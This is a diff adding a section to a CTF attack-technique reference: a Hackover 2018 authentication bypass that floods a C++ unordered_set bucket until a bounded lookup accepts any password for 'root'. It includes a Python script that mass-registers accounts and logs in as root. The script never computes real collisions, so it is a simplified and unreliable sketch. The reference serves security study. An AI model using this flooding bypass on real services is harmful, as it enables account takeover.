@@ -26,6 +26,7 @@
 - [Subdomain Takeover](#subdomain-takeover)
 - [Apache mod_status Information Disclosure + Session Forging (29c3 CTF 2012)](#apache-mod_status-information-disclosure--session-forging-29c3-ctf-2012)
 - [JA4/JA4H TLS and HTTP Fingerprint Matching (BSidesSF 2026)](#ja4ja4h-tls-and-http-fingerprint-matching-bsidessf-2026)
+- [std::unordered_set Bucket Collision Auth Bypass (Hackover 2018)](#stdunordered_set-bucket-collision-auth-bypass-hackover-2018)
 
 For JWT/JWE token attacks, see [auth-jwt.md](auth-jwt.md). For OAuth/OIDC, SAML, CI/CD credential theft, and infrastructure auth attacks, see [auth-infra.md](auth-infra.md).
 
@@ -744,3 +745,30 @@ headers = collections.OrderedDict([
 - `curl -v --ciphers <list> --tls-max 1.2` to manually control TLS parameters
 
 **References:** BSidesSF 2026 "cloudpear"
+
+---
+
+## std::unordered_set Bucket Collision Auth Bypass (Hackover 2018)
+
+**Pattern:** A C++ backend stores credential hashes in `std::unordered_set<std::string>`. The set's bucket index is derived from only the first bytes of a SHA-512 digest (truncated `size_t` hash). The lookup loop aborts early after a bounded number of bucket probes (`MAX_LOOKUPS = 1000`). Flood the set with 1000+ entries that all collide in the same bucket as the `root` account — the compare for the correct entry never executes and the call returns "found" on an attacker-chosen password.
+
+```cpp
+// Vulnerable shape
+std::unordered_set<std::string> users;
+auto it = users.find(login_key);           // probes at most MAX_LOOKUPS
+if (it != users.end()) { /* accepted */ }
+```
+
+```python
+# Flood registration: every entry collides in root's bucket
+import requests
+for i in range(1100):
+    requests.post("http://target/register",
+                  data={"name": f"ro{i:04d}", "password": "ot1"})
+# Log in as root with an arbitrary password — loop gives up before compare
+requests.post("http://target/login", data={"name": "root", "password": "anything"})
+```
+
+**Key insight:** Hash-table implementations that truncate digests into bucket indices expose a second-preimage surface: the attacker only has to match the bucket, not the full hash. When the data structure also has a bounded probe count (DoS guard), flooding the bucket turns an authentication check into an unconditional accept. Any `unordered_map`/`unordered_set` keyed on low-entropy derivations of user input is suspect — watch for `std::hash<std::string>` implementations that reduce to `size_t` via XOR-folding.
+
+**References:** Hackover CTF 2018 — secure-hash, writeup 11502
